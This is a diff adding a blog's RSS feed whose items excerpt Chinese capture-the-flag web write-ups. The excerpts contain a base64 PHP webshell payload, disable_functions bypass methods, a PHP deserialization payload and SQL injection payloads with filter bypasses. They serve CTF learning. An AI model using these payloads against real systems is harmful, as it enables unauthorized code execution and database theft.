@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>NodeJS on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/nodejs/</link>
+    <description>Recent content in NodeJS on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 20 Jun 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/nodejs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>GKCTF2020复现</title>
+      <link>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</guid>
+      <description>GKCTF，题好平台棒，因为那段时间比赛太多就没打，现在填坑
+ CheckIN 考点：PHP73 bypass disable_functions
+打开题目是源码：
+&amp;lt;title&amp;gt;Check_In&amp;lt;/title&amp;gt;&amp;lt;?phphighlight_file(__FILE__);class ClassName{public $code = null;public $decode = null;function __construct(){$this-&amp;gt;code = @$this-&amp;gt;x()[&#39;Ginkgo&#39;];$this-&amp;gt;decode = @base64_decode( $this-&amp;gt;code );@Eval($this-&amp;gt;decode);}public function x(){return $_REQUEST;}}new ClassName();目标很明确，传入 ?Ginkgo=（PHP代码） 就可以RCE，我们执行以下 phpinfo() 发现正常回显，但是system却没有回显。
+我先构造一个shell蚁剑连接再说：?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs= （?Ginkgo=eval($_POST[&amp;lsquo;cmd&amp;rsquo;]);）
+连接上之后，可以使用文件系统，但是虚拟终端却不能执行命令，猜测是disable_functions，在phpinfo里面果然翻到了
+关于bypass diable_functions，这里推荐一篇文章
+有四种绕过 disable_functions 的手法：
+ 第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞； 第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼； 第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制； 第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.</description>
+    </item>
+    
+    <item>
+      <title>NPUCTF2020_wp</title>
+      <link>https://anthem-whisper.github.io/p/npuctf2020_wp/</link>
+      <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/npuctf2020_wp/</guid>
+      <description>查源码 F12，ctrl+U，没啥好说的
+RealEzPHP 打开是个黑页，查看源码发现了 ./time.php?source 访问之：
+ &amp;lt;?php#error_reporting(0);class HelloPhp{public $a;public $b;public function __construct(){$this-&amp;gt;a = &amp;quot;Y-m-d h:i:s&amp;quot;;$this-&amp;gt;b = &amp;quot;date&amp;quot;;}public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){highlight_file(__FILE__);die(0);}@$ppp = unserialize($_GET[&amp;quot;data&amp;quot;]);2020-04-21 07:53:29很简单的一个反序列化，
+&amp;lt;?php#error_reporting(0);class HelloPhp{public $a = &#39;1&#39;;//更改为2，3，4，5能读取更多信息public $b = &#39;phpinfo&#39;;/*public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}*/}$pop = new HelloPhp;echo serialize($pop);直接 ?</description>
+    </item>
+    
+    <item>
+      <title>2020 X1cT34m Web第一次考核</title>
+      <link>https://anthem-whisper.github.io/p/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/</link>
+      <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/</guid>
+      <description>0x00前言 终于等到来的太突然的考核，感觉自己表现不是太好，本来入门时间也不短了，是因为不够努力才这么菜
+玩了一把内网渗透（不是），感觉有点意思。
+0x01第一题 考点：sqli
+ username中\转义&amp;rsquo;导致password语句逃逸单引号 union注入 绕过逗号过滤继续注入 无列名注入  打开题目，抓包，发现POST过去的数据是json形式，没想到其他，只想到了sqli，于是我用bp的intruder模块fuzz了一下：
+(这里本来有一个表，莫名其妙消失了)
+被过滤：单引号、|、，、or、空格
+没被过滤：select、union
+空格被过滤，用//代替，（可以使用word的替换功能）本文的空格都是//
+既然单引号被过滤了，那么就想到了CGCTF和之前的BJDCTF的注入，利用username输入反斜杠来转义单引号，直接看例子：
+原本语句：SELECT * from user WHERE username = &#39;admin&#39; and password = &#39;123&#39;转义语句：SELECT * from user WHERE username = &#39;admin\&#39; and password =&#39; or 1=1#&#39;我们可以看到，实际上第二句的username是&#39;admin\&#39; and password =&#39;后门接的or 1=1自然也就造成了注入。
+这道题正常输入的时候回显是username or password error如果使用这个playload的话回显是true
+union没有被过滤的话，那么就尝试union注入吧：
+查询列数：{&amp;quot;username&amp;quot;:&amp;quot;1\\&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;group/**/by/**/1#&amp;quot;}这里有点玄学的是，明明查的是三列，但是只能group by 1有回显，就很神奇。
+查询列数： {&amp;quot;username&amp;quot;:&amp;quot;1\\&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;union/**/select/**/1,2,3#&amp;quot;}回显是“WAF！！！”因为逗号被过滤了
+利用join绕过逗号过滤：
+union select * from ((select 1)A join (select 2)B join (select 3)C)#//union select * from ((select 1)A join (select 2)B join (select 3)C)#查询成功，列数为3，2和3分别为username和password的回显位置，就可以替换为子查询，但是最致命的是or被过滤了，造成了information_schema背锅，所以我们需要bypass information_schema</description>
+    </item>
+    
+  </channel>
+</rss>
